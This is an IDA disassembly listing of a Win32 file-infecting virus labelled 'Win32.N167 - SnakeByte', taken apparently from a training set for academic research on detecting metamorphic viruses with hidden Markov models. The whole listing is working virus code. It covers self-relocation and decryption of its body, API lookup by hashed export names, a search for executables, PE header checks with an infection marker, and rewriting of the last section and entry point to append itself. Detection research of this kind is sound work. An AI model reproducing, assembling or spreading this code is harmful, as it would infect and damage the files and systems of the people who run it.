

;
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º	This file is generated by The Interactive Disassembler (IDA)	    º
; º	Copyright (c) 2003 by DataRescue sa/nv,	<ida@datarescue.com>	    º
; º Licensed to: Mark Stamp, San Jose State University,	1 user,	academic, 11/2003 º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; File Name   :	C:\Documents and Settings\Fiona\My Documents\CS	298_Metamorphic	virus\HMM\TrainSet\Executable\N167.EXE
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00038000 ( 229376.)
; Section size in file		: 00037C00 ( 228352.)
; Offset to raw	data for section: 00000600
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?

		model flat

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Execute
CODE		segment	para public 'CODE' use32
		assume cs:CODE
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

		public start
start:
		nop
		nop
		nop

		nop
		nop
		nop

loc_438270:				; DATA XREF: CODE:0043868Dr
		call	loc_438279
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_438275	dd 0			; DATA XREF: CODE:00438280o
					; CODE:0043829Cr ...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_438279:				; CODE XREF: CODE:00438270p
		mov	ecx, [esp]
		dec	esp
		add	esp, 5
		sub	ecx, offset dword_438275
		mov	ebp, ecx
		push	ebp
		pop	esi
		or	esi, esi
		jz	short near ptr dword_4382AC
		lea	ecx, dword_4382AC[ebp]
		push	1FBh
		pop	edx

loc_43829A:				; CODE XREF: CODE:004382AAj
		mov	ebx, [ecx]
		add	ebx, ss:dword_438275[ebp]
		mov	[ecx], ebx
		add	ecx, 4
		sub	edx, 1
		jnz	short loc_43829A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_4382AC	dd 239E9h		; CODE XREF: CODE:0043828Cj
					; DATA XREF: CODE:0043828Er
		db 0, 0FFh, 0B5h
		dd offset dword_4384DA
		db 8Fh,	85h
		dd offset dword_4382D4
		db 0FFh, 0B5h
		dd offset dword_4384B6
		db 8Fh,	85h
		dd offset dword_4382CE
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4382C9:				; CODE XREF: CODE:00438740j
					; sub_4387B2+96j
		test	ebp, ebp
		jz	short near ptr dword_4382DA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		db 0BAh
dword_4382CE	dd 0			; DATA XREF: CODE:004382C5o
					; CODE:004386FEw
		db 81h,	0C2h
dword_4382D4	dd 0			; DATA XREF: CODE:004382B9o
					; CODE:004386F2w
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		jmp	edx
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_4382DA	dd 0B4E8006Ah, 7	; CODE XREF: CODE:004382CBj
					; DATA XREF: CODE:004385A5w ...
		db 3 dup(0)
		dd 0			; DATA XREF: CODE:004384FAo
					; CODE:00438504o ...
dword_4382E9	dd 0			; DATA XREF: sub_4387B2+82w
					; sub_4387B2+8Cw ...
aWin32_n167Snak	db 'Win32.N167 - SnakeByte',0
		dd 0			; DATA XREF: sub_438745+5Fw
					; sub_4387B2+26r
dword_438308	dd 0			; DATA XREF: CODE:0043858Ew
					; CODE:0043859Fr ...
dword_43830C	dd 0			; DATA XREF: CODE:0043873Ar
					; CODE:0043889Bo
dword_438310	dd 0			; DATA XREF: sub_438900+49r
dword_438314	dd 0			; DATA XREF: sub_438900+22r
dword_438318	dd 0			; DATA XREF: sub_4389A7+14r
dword_43831C	dd 0			; DATA XREF: sub_4389C5+Dr
dword_438320	dd 0			; DATA XREF: sub_438970+6r
dword_438324	dd 0			; DATA XREF: sub_4388D2+18r
dword_438328	dd 0			; DATA XREF: sub_4386D5+7r
dword_43832C	dd 0			; DATA XREF: sub_438900+68r
					; sub_438970+12r
dword_438330	dd 0			; DATA XREF: CODE:00438573r
					; CODE:004385CEr ...
dword_438334	dd 0			; DATA XREF: sub_4387B2+64r
					; CODE:00438895w
dword_438338	dd 0			; DATA XREF: CODE:00438556w
					; sub_4387B2+Ar ...
dword_43833C	dd 0			; DATA XREF: sub_438900+29w
					; sub_438900+43r ...
dword_438340	dd 0			; DATA XREF: CODE:00438566r
					; sub_4386D5+1r ...
dword_438344	dd 0C200BE21h		; DATA XREF: CODE:004388A2r
		dd 797B49ECh, 96B2D96Ch, 0AA700106h, 0AE17EBEFh, 94524B42h
		dd 8C892DDFh, 613FD7BAh, 68624A9Dh
word_438368	dw 0			; DATA XREF: sub_4387B2+3Ew
					; sub_4387B2+45r ...
dword_43836A	dd 78452E2Ah		; DATA XREF: CODE:00438704o
		db 65h,	0
dword_438370	dd 0			; DATA XREF: sub_4389A7+7o
					; sub_4389C5+5r
		dd 6 dup(0)
dword_43838C	dd 0			; DATA XREF: sub_438A1Fr
dword_438390	dd 0			; DATA XREF: CODE:00438581r
					; CODE:004385BDw ...
		dd 2 dup(0)
dword_43839C	dd 0			; DATA XREF: sub_4388D2+10o
					; sub_438989+9r
		dd 45h dup(0)
		db 2 dup(0)
dword_4384B6	dd 0			; DATA XREF: CODE:004382BFo
					; CODE:00438603w ...
dword_4384BA	dd 8 dup(0)		; DATA XREF: sub_4387B2+17w
					; sub_4387B2+33r ...
dword_4384DA	dd 4 dup(0), 0FFF9B958h, 0C183FFFFh, 66E12B0Bh,	85C7C02Bh
					; DATA XREF: CODE:004382B3o
					; CODE:004385FAw ...
		dd offset dword_4382E5
		dd 3516h
		db 81h,	0ADh
		dd offset dword_4382E5
		dd 204h
		db 8Bh,	95h
		dd offset dword_4382E5
		align 4
		dd 96E90575h, 2BFFFFFDh, 388166CAh, 18745A4Dh, 0FFF2BAh
		dd 0EC28300h, 8DFFC22Bh
		dd offset dword_4382E5
		dd 4943D281h, 0D0EB03BCh, 813C708Bh, 94C6B5F2h,	66F00304h
		dd 45503E81h, 0D4EB0274h
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		mov	ss:(dword_4384BA+1Ch)[ebp], esi
		mov	ss:dword_438338[ebp], eax
		jmp	loc_43884D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_438561:				; CODE XREF: sub_438A1F+69p
		call	sub_4386D5
		push	ss:dword_438340[ebp]
		pop	ebx
		mov	ss:dword_438275[ebp], ebx
		mov	edx, ss:dword_438330[ebp]
		mov	ecx, edx
		add	ecx, [edx+3Ch]
		mov	edx, [ecx+3Ch]
		push	ss:dword_438390[ebp]
		pop	ebx
		add	ebx, 825h
		mov	ss:dword_438308[ebp], ebx
		mov	ss:(dword_4384DA+4)[ebp], edx
		call	sub_4389E9
		mov	ebx, ss:dword_438308[ebp]
		mov	ss:(dword_4382DA+7)[ebp], 0
		add	ss:(dword_4382DA+7)[ebp], ebx
		pusha
		call	sub_438970
		popa
		push	ebx
		pop	ss:dword_438390[ebp]
		call	sub_438900
		jb	loc_4386D3
		push	ss:dword_438330[ebp]
		pop	esi
		mov	eax, esi
		add	eax, [esi+3Ch]
		push	eax
		pop	esi
		xor	ebx, ebx
		mov	bx, [esi+6]
		add	ebx, 0FFFFFFFFh
		imul	ebx, 28h
		add	eax, ebx
		add	eax, 78h
		mov	ebx, [esi+74h]
		shl	ebx, 3
		add	eax, ebx
		mov	ecx, [esi+34h]
		neg	edx
		mov	ss:dword_4384DA[ebp], ecx
		mov	edx, [esi+28h]
		mov	ss:dword_4384B6[ebp], edx
		mov	ebx, [eax+10h]
		sub	ecx, ecx
		add	ecx, ebx
		add	eax, 14h
		add	ebx, [eax]
		sub	eax, 14h
		push	ebx
		mov	edx, ecx
		add	edx, [eax+0Ch]
		mov	[esi+28h], edx
		mov	ss:(dword_4384BA+10h)[ebp], edx
		mov	edx, [eax+10h]
		push	edx
		push	dword ptr [esi+3Ch]
		add	edx, 825h
		inc	ss:(dword_4384BA+4)[ebp]
		pop	ss:(dword_4384DA+4)[ebp]
		mov	ss:dword_438308[ebp], edx
		call	sub_4389E9
		mov	edx, ss:dword_438308[ebp]
		mov	[eax+10h], edx
		pop	edx
		add	edx, 43Dh
		add	edx, 3E8h
		mov	dword ptr [eax+8], 0
		add	[eax+8], edx
		mov	edx, [eax+0Ch]
		add	edx, [eax+10h]
		mov	[esi+50h], edx
		or	dword ptr [eax+24h], 0A0000020h
		xor	ss:(dword_4384BA+4)[ebp], 1713774h
		mov	dword ptr [esi+4Ch], 4E313637h
		pop	edi
		lea	esi, loc_438270[ebp]
		add	edi, ss:dword_438330[ebp]
		mov	ebx, 3Ch

loc_43869E:				; CODE XREF: CODE:004386A0j
		movsb
		dec	ebx
		jnz	short loc_43869E
		mov	ebx, 1FBh

loc_4386A7:				; CODE XREF: CODE:004386B2j
		lodsd
		sub	eax, ss:dword_438275[ebp]
		stosd
		sub	ebx, 1
		jnz	short loc_4386A7
		mov	ecx, 0FFFF7374h
		add	ecx, 8C8Ch
		add	ecx, ss:(dword_4384DA+8)[ebp]
		rcl	edx, 1Ch
		sub	ecx, 1
		mov	ss:(dword_4384DA+8)[ebp], ecx
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4386D3:				; CODE XREF: CODE:004385C8j
		stc
		retn

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4386D5	proc near		; CODE XREF: CODE:00438561p
		pusha
		and	edx, ss:dword_438340[ebp]
		call	ss:dword_438328[ebp]
		xor	edx, eax
		mov	ss:dword_438340[ebp], edx
		popa
		retn
sub_4386D5	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
byte_4386EC	db 8Bh,	85h		; DATA XREF: CODE:004388CAr
		dd offset dword_4384DA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		mov	ss:dword_4382D4[ebp], eax
		mov	ecx, ss:dword_4384B6[ebp]
		mov	ss:dword_4382CE[ebp], ecx
		mov	esi, offset dword_43836A
		add	esi, ebp
		push	14h
		pop	ss:(dword_4384DA+8)[ebp]
		call	sub_4389C5
		inc	eax
		jz	short loc_438733
		dec	ecx

loc_43871C:				; CODE XREF: CODE:00438731j
		call	sub_438A1F
		cmp	ss:(dword_4384DA+8)[ebp], 0
		jbe	short loc_438733
		call	sub_4389A7
		test	eax, eax
		jnz	short loc_43871C

loc_438733:				; CODE XREF: CODE:00438719j
					; CODE:00438728j
		mov	eax, ss:(dword_4384BA+18h)[ebp]
		push	eax
		call	ss:dword_43830C[ebp]
		jmp	loc_4382C9

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_438745	proc near		; CODE XREF: sub_4387B2+1Ep
		pusha
		mov	edi, edi
		push	edi
		pop	ebx

loc_43874A:				; CODE XREF: sub_438745+Bj
		sub	ebx, 0FFFFFFFFh
		test	byte ptr [ebx],	0
		jnz	short loc_43874A
		sub	ebx, edi
		push	ebx
		pop	esi
		inc	esi
		cld
		push	0
		pop	ecx
		sub	ecx, 1
		mov	edx, ecx

loc_438760:				; CODE XREF: sub_438745+51j
		and	ebx, 0
		mov	eax, 0E2F0h
		sub	eax, 0E2F0h
		mov	bl, [edi]
		sub	edi, 0FFFFFFFFh
		xor	bl, cl
		mov	cl, ch
		mov	ch, dl
		mov	dl, dh
		mov	dh, 8

loc_43877C:				; CODE XREF: sub_438745+4Aj
		shr	ax, 1
		rcr	bx, 1
		jnb	short loc_43878D
		xor	bx, 8320h
		xor	ax, 0EDB8h

loc_43878D:				; CODE XREF: sub_438745+3Dj
		dec	dh
		jnz	short loc_43877C
		xor	ecx, ebx
		xor	edx, eax
		dec	esi
		jnz	short loc_438760
		not	edx
		not	ecx
		mov	ebx, edx
		rol	ebx, 10h
		mov	bx, cx
		mov	ss:dword_438304[ebp], ebx
		popa
		retn
sub_438745	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		mov	ss:(dword_4384BA+4)[ebp], ecx

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4387B2	proc near		; CODE XREF: CODE:004388B0p
		pusha
		mov	eax, ss:(dword_4384BA+8)[ebp]

loc_4387B9:				; CODE XREF: sub_4387B2+50j
		push	eax
		mov	ecx, [eax]
		add	ecx, ss:dword_438338[ebp]
		mov	eax, ecx
		xor	edi, edi
		add	edi, ecx
		push	edi
		mov	ss:dword_4384BA[ebp], esi
		cld
		call	sub_438745
		push	0
		pop	ecx
		add	ecx, ss:dword_438304[ebp]
		sub	ecx, [esi]
		cmp	ecx, 0
		jz	short loc_438804
		mov	esi, ss:dword_4384BA[ebp]
		pop	edi
		pop	eax
		add	eax, 4
		inc	ss:word_438368[ebp]
		cmp	ss:word_438368[ebp], 2004h
		jz	short loc_438846
		jmp	short loc_4387B9
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_438804:				; CODE XREF: sub_4387B2+31j
		add	esp, 8
		mov	edx, 0
		mov	dx, ss:word_438368[ebp]
		clc
		rcl	edx, 1
		add	edx, ss:dword_438334[ebp]
		xchg	eax, edx
		push	0
		pop	edx
		mov	dx, [eax]
		shl	edx, 2
		add	edx, ss:(dword_4384BA+14h)[ebp]
		mov	eax, [edx]
		add	eax, ss:dword_438338[ebp]
		mov	ss:dword_4382E9[ebp], 0
		add	ss:dword_4382E9[ebp], eax
		popa
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_438846:				; CODE XREF: sub_4387B2+4Ej
		pop	edx
		popa
		jmp	loc_4382C9
sub_4387B2	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_43884D:				; CODE XREF: CODE:0043855Cj
		mov	ebx, 9
		push	0
		pop	edx
		add	edx, ss:(dword_4384BA+1Ch)[ebp]
		mov	eax, [edx+78h]
		add	eax, ss:dword_438338[ebp]
		dec	eax
		add	eax, 1Dh
		mov	edx, [eax]
		add	eax, 4
		add	edx, ss:dword_438338[ebp]
		mov	ss:(dword_4384BA+14h)[ebp], edx
		mov	edx, [eax]
		add	eax, 4
		rol	ecx, 1Bh
		add	edx, ss:dword_438338[ebp]
		mov	ss:(dword_4384BA+8)[ebp], edx
		mov	edx, [eax]
		add	edx, ss:dword_438338[ebp]
		mov	ss:dword_438334[ebp], edx
		mov	edx, offset dword_43830C
		add	edx, ebp
		lea	esi, dword_438344[ebp]

loc_4388A8:				; CODE XREF: CODE:004388C8j
		and	ss:word_438368[ebp], 0
		call	sub_4387B2
		dec	esi
		add	esi, 5
		mov	eax, ss:dword_4382E9[ebp]
		mov	[edx], eax
		dec	edx
		add	edx, 5
		sub	ebx, 1
		jnz	short loc_4388A8
		lea	edi, byte_4386EC[ebp]
		push	edi
		retn

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4388D2	proc near		; CODE XREF: sub_438A1F+Bp
		sub	eax, eax
		push	eax
		push	eax
		push	3
		push	eax
		sub	eax, 0FFFFFFFFh
		push	eax
		push	0C0000000h
		mov	ebx, offset dword_43839C
		add	ebx, ebp
		push	ebx
		call	ss:dword_438324[ebp]
		add	eax, 1
		jz	short loc_43896E
		sub	eax, 1
		lea	edi, (dword_4384BA+0Ch)[ebp]
		mov	[edi], eax
sub_4388D2	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_438900	proc near		; CODE XREF: CODE:004385C3p
		push	ss:dword_438390[ebp]
		pop	ebx
		push	ebx
		push	0
		push	ebx
		push	0
		mov	ecx, 19h
		sub	ecx, 15h
		and	edx, ebx
		push	ecx
		push	0
		mov	edx, ebx
		push	ss:(dword_4384BA+0Ch)[ebp]
		call	ss:dword_438314[ebp]
		push	eax
		pop	ss:dword_43833C[ebp]
		pop	ebx
		cmp	eax, 0
		jz	short loc_438962
		sub	ecx, ecx
		push	ebx
		push	ecx
		push	ecx
		mov	edx, 27h
		sub	edx, 25h
		push	edx
		push	ss:dword_43833C[ebp]
		call	ss:dword_438310[ebp]
		cmp	eax, 0
		jz	short loc_43895D
		push	eax
		pop	ss:dword_438330[ebp]
		clc
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_43895D:				; CODE XREF: sub_438900+52j
					; sub_438A1F+70p
		call	sub_438970

loc_438962:				; CODE XREF: sub_438900+33j
		push	ss:(dword_4384BA+0Ch)[ebp]
		call	ss:dword_43832C[ebp]

loc_43896E:				; CODE XREF: sub_4388D2+21j
		stc
		retn
sub_438900	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_438970	proc near		; CODE XREF: CODE:004385B6p
					; sub_438900+5Dp
		push	ss:dword_438330[ebp]
		call	ss:dword_438320[ebp]
		push	ss:dword_43833C[ebp]
		call	ss:dword_43832C[ebp]
		retn
sub_438970	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_438989	proc near		; CODE XREF: sub_4389A7p sub_4389C5p
		pusha
		mov	ebx, 101h
		add	ebx, 13h
		lea	edx, dword_43839C[ebp]

loc_438998:				; CODE XREF: sub_438989+14j
		mov	byte ptr [edx],	0
		inc	edx
		dec	ebx
		jnz	short loc_438998
		popa
		retn
sub_438989	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		dec	ss:(dword_4384BA+4)[ebp]

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4389A7	proc near		; CODE XREF: CODE:0043872Ap
		call	sub_438989
		mov	eax, ebp
		add	eax, offset dword_438370
		push	eax
		mov	ebx, ss:(dword_4384BA+18h)[ebp]
		push	ebx
		call	ss:dword_438318[ebp]
		retn
sub_4389A7	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		shr	eax, 11h

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4389C5	proc near		; CODE XREF: CODE:00438713p
		call	sub_438989
		lea	eax, dword_438370[ebp]
		push	eax
		push	esi
		call	ss:dword_43831C[ebp]
		mov	ss:(dword_4384BA+18h)[ebp], 0
		add	ss:(dword_4384BA+18h)[ebp], eax
		retn
sub_4389C5	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4389E9	proc near		; CODE XREF: CODE:0043859Ap
					; CODE:00438646p
		pusha
		mov	edx, 0
		mov	eax, ss:dword_438308[ebp]
		mov	ebx, ss:(dword_4384DA+4)[ebp]
		mov	ss:(dword_4384DA+0Ch)[ebp], eax
		div	ebx
		sub	ebx, edx
		mov	eax, ss:(dword_4384DA+0Ch)[ebp]
		add	eax, ebx
		mov	ss:dword_438308[ebp], 0
		add	ss:dword_438308[ebp], eax
		popa
		retn
sub_4389E9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_438A1F	proc near		; CODE XREF: CODE:0043871Cp
		mov	edx, ss:dword_43838C[ebp]
		cmp	edx, 0
		jnz	short locret_438A94
		call	sub_4388D2
		jb	short locret_438A94
		xor	ecx, 136DB5Dh
		and	esi, 0
		add	esi, ss:dword_438330[ebp]
		cmp	word ptr [esi],	5A4Dh
		jz	short loc_438A49
		jmp	short loc_438A8F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_438A49:				; CODE XREF: sub_438A1F+26j
		cmp	word ptr [esi+3Ch], 0
		jz	short loc_438A8F
		push	0
		pop	ebx
		add	ebx, [esi+3Ch]
		cmp	ebx, ss:dword_438390[ebp]
		ja	short loc_438A8F
		add	ebx, esi
		movzx	ecx, word ptr [ebx]
		sub	ecx, 4550h
		jz	short loc_438A6D
		jmp	short loc_438A8F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_438A6D:				; CODE XREF: sub_438A1F+4Aj
		cmp	dword ptr [ebx+4Ch], 4E313637h
		jnz	short loc_438A78
		jmp	short loc_438A8F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_438A78:				; CODE XREF: sub_438A1F+55j
		mov	dx, [ebx+16h]
		and	dx, 0F000h
		cmp	dx, 2000h
		jz	short loc_438A8F
		call	loc_438561
		jb	short locret_438A94

loc_438A8F:				; CODE XREF: sub_438A1F+28j
					; sub_438A1F+2Fj ...
		call	loc_43895D

locret_438A94:				; CODE XREF: sub_438A1F+9j
					; sub_438A1F+10j ...
		retn
sub_438A1F	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		jmp	ds:ExitProcess
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		dd 59h dup(0)
		align 4
		dd 100h	dup(?)
CODE		ends

; Section 2. (virtual address 00039000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00038200
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
